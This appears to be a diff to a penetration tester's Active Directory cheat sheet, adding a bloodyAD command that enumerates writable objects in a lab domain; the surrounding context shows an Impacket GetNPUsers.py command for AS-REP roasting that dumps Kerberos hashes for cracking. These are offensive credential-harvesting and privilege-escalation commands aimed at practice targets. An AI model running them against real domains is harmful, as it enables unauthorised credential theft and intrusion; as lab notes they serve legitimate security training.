@@ -120,6 +120,14 @@ Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/
 
 ---
 
+## 16. Enumerate Writable Objects
+```powershell
+bloodyAD --host <target-ip> --dns <target-ip> -d checkpoint.htb \
+  -u alex.turner -p '<provided-password>' get writable
+```
+
+---
+
 ## 16. AS-REP Roasting
 ```powershell
 python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
